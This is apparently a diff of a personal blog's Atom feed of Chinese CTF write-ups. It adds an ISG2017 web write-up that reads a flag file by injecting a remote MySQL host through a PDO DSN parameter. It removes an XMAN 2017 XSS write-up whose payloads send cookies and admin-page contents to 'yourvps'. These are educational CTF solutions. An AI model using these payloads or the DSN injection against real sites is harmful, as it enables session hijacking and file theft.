@@ -168,9 +168,50 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+  </entry>
+  
+  <entry>
+    <title>ISG2017-wmwcms-writeup</title>
+    <link href="http://yoursite.com/2017/08/31/ISG2017-wmwcms-writeup/"/>
+    <id>http://yoursite.com/2017/08/31/ISG2017-wmwcms-writeup/</id>
+    <published>2017-08-31T08:29:51.000Z</published>
+    <updated>2017-08-31T10:06:49.113Z</updated>
+    
+    <content type="html"><![CDATA[<p>ISG2017-wmwcms-writeup<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can u conquer this crude cms and get flag?</div><div class="line">link: http://202.120.7.204:7242</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看robots.txt，可以发现有压缩包，下载下来后得到源码。</p>
+<p>文件目录如下；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/3.png?raw=true" alt=""></p>
+<p>public/app.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    session_start();</div><div class="line">    define(<span class="string">'APP_PATH'</span>, dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/server/'</span>);</div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'sql.php'</span>;</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'func.php'</span>;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</div><div class="line">        errormsg(<span class="string">"action is required."</span>);</div><div class="line">    &#125;</div><div class="line">    $actions = [<span class="string">"login"</span>, <span class="string">"logout"</span>, <span class="string">"img"</span>];</div><div class="line">    <span class="keyword">if</span> (!in_array($_GET[<span class="string">"action"</span>], $actions)) &#123;</div><div class="line">        errormsg(<span class="string">'Hacking attempt'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span> APP_PATH . $_GET[<span class="string">"action"</span>] . <span class="string">".php"</span>;</div><div class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>server/img.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'sql.php'</span>;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'uid'</span>])) &#123;</div><div class="line">    $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $uid = intval($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $sql = <span class="string">"select portrait from user where id = ?"</span>;</div><div class="line">    $sth = $dbh-&gt;prepare($sql);</div><div class="line">    $sth-&gt;execute([$uid]);</div><div class="line">    $user = $sth-&gt;fetchAll();</div><div class="line">    <span class="keyword">if</span>(count($user) &gt; <span class="number">0</span>)&#123;</div><div class="line">        $user = $user[<span class="number">0</span>];</div><div class="line">        $portrait = $user[<span class="string">"portrait"</span>];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">header(<span class="string">"Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate"</span>);</div><div class="line">header(<span class="string">"Content-type: image/png;charset=gb2312"</span>);</div><div class="line"><span class="keyword">echo</span> file_get_contents($portrait);</div></pre></td></tr></table></figure></p>
+<p>server/sql.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
+<p>先配置远程数据库可以访问。修改/etc/mysql/mysql.conf.d/mysqld.cnf。将里面的bind-address = 127.0.0.1注释掉。</p>
+<p>接下来配置mysql。这里我用root身份登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">mysql&gt; USE wmwcms;</div><div class="line">Database changed</div><div class="line">mysql&gt; CREATE TABLE `user` (</div><div class="line">    -&gt;   `id` INT AUTO_INCREMENT,</div><div class="line">    -&gt;   `name` VARCHAR(100) NULL,</div><div class="line">    -&gt;   `pwd` VARCHAR(64) NOT NULL,</div><div class="line">    -&gt;   `portrait` VARCHAR(64) DEFAULT &quot;../server/flag&quot;,</div><div class="line">    -&gt;   PRIMARY KEY (`id`),</div><div class="line">    -&gt;   UNIQUE KEY `Duplicate_name` (`name`)</div><div class="line">    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;</div><div class="line">Query OK, 0 rows affected (0.19 sec)</div><div class="line"></div><div class="line">mysql&gt; INSERT INTO `user` (`name`, `pwd`) values (&quot;test&quot;, &quot;a94a8fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);</div><div class="line">Query OK, 1 row affected (1.06 sec)</div><div class="line"></div><div class="line">mysql&gt; select id,name,pwd,portrait from user;</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">| id | name | pwd                                      | portrait       |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">|  1 | test | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | ../server/flag |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>然后创建wmwcms用户，@后面有个%，表示可以远程登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE USER &apos;wmwcms@%&apos; IDENTIFIED BY &quot;%glVYKTkLtQ22&quot;;</div><div class="line">Query OK, 0 rows affected (2.35 sec)</div></pre></td></tr></table></figure></p>
+<p>并为它授权:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant all privileges on wmwcms.* to &apos;wmwcms&apos;@&apos;%&apos; identified by &apos;%glVYKTkLtQ22&apos;;</div><div class="line">Query OK, 0 rows affected, 1 warning (0.03 sec)</div></pre></td></tr></table></figure></p>
+<p>这样当我们传入的GET参数为<code>dsn=wmwcms;host=yourvps;port=yourport</code>，后端的sql.php中的pdo会去连接你远程的数据库。之后执行img.php时，从中取出的portrait为我们数据库中的portrait字段，这里为<code>../server/flag</code>。继续执行则到了<code>echo file_get_contents($portrait);</code>，也即执行<code>echo file_get_contents(&quot;../server/flag&quot;);</code></p>
+<p>为什么数据库中要设置成<code>../server/flag</code>，注意app.php是在public文件的，而且默认的<code>$portrait = &quot;img/user.png&quot;</code>，也表明是在public文件夹下。而从源码中可知，flag在server文件夹下，所以需要返回上一层文件夹才能读取。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/2.png?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;a107063477b1dd64dabbcaeebf636f7b&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;ISG2017-wmwcms-writeup&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
@@ -213,9 +254,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
       <category term="Forensic" scheme="http://yoursite.com/tags/Forensic/"/>
     
@@ -261,9 +302,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
       <category term="Forensic" scheme="http://yoursite.com/tags/Forensic/"/>
     
@@ -402,9 +443,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
   </entry>
   
@@ -580,9 +621,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
-    
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
       <category term="steg" scheme="http://yoursite.com/tags/steg/"/>
     
@@ -1032,46 +1073,6 @@
       <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
       <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XMAN夏令营-2017-XSS-writeup</title>
-    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/"/>
-    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/</id>
-    <published>2017-08-22T10:19:15.000Z</published>
-    <updated>2017-08-22T13:50:23.910Z</updated>
-    
-    <content type="html"><![CDATA[<p>xss<br><a id="more"></a></p>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:33323/</div></pre></td></tr></table></figure>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看csp头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</div></pre></td></tr></table></figure></p>
-<p>这里给出一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    var head = document.getElementsByTagName(&quot;head&quot;)[0]</div><div class="line">    var n0t = document.createElement(&quot;link&quot;);</div><div class="line">    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</div><div class="line">    n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie);</div><div class="line">    head.appendChild(n0t);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true" alt=""></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:43425</div></pre></td></tr></table></figure>
-<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
-<p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
-<p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
-<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;xss&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
